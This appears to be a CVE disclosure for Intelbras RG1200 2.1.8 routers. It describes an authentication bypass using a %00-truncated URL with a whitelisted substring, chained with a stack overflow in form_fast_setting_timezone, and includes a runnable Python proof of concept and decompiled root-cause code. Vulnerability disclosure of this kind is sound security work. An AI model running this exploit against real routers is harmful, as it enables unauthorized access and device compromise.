# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`form_fast_setting_timezone`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`form_fast_setting_timezone`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `form_fast_setting_timezone`. The handler parses the user-controlled `timeZone` parameter into small fixed-size stack buffers using unbounded `sscanf`, then copies data with `strcpy` into another small stack buffer, allowing out-of-bounds writes.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
    base = f"http://{target_ip}:{port}"

    # Endpoint naming here follows the dataset convention: use the function name.
    url = f"{base}/goform/form_fast_setting_timezone%00img/main-logo.png"

    data = {
        "timeZone": "+12:" + ("A" * 100),
    }

    headers = {
        "Cookie": cookie,
    }

    r = requests.post(url, data=data, headers=headers, timeout=10)
    print("status:", r.status_code)
    print(r.text[:2000])


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: python poc.py <target_ip> [port]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/form_fast_setting_timezone%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/form_fast_setting_timezone` and dispatch to the handler.

### 2. Stack Buffer Overflow — Unbounded sscanf + strcpy in form_fast_setting_timezone

`form_fast_setting_timezone` (0x4416f0) obtains `timestr = websGetVar(wp, "timeZone", ...)` and parses it via unbounded `sscanf` into tiny 4-byte stack buffers, then copies the result with `strcpy` into another 4-byte buffer:

```c
// form_fast_setting_timezone (0x4416f0)
void __cdecl form_fast_setting_timezone(webs_t wp)
{
    char *timestr;
    char sys_timezone[4];          // ← 4-byte stack buffer
    char sys_timenextzone[4];      // ← 4-byte stack buffer
    char timespand[2][4];          // ← 2 × 4-byte stack buffers

    *(_DWORD *)sys_timezone = 0;
    *(_DWORD *)sys_timenextzone = 0;
    timestr = websGetVar(wp, "timeZone", byte_4E7E10);
    if ( *timestr && timestr != (char *)-1
      && sscanf(timestr + 1, "%[^:]:%s", timespand, timespand[1]) == 2 )  // ← OVERFLOW: unbounded into 4-byte buffers
    {
        // ...
        strcpy(sys_timenextzone, timespand[1]);  // ← OVERFLOW: copies untrusted data into 4-byte buffer
        SetValue("sys.timezone", sys_timezone);
        SetValue("sys.timenextzone", sys_timenextzone);
    }
}
```

The `sscanf` format `"%[^:]:%s"` has no width limits. A `timeZone` value like `"+12:" + "A" * 100` causes `%s` to write 100 bytes into `timespand[1]` (only 4 bytes), then `strcpy` further overflows `sys_timenextzone` (also 4 bytes).



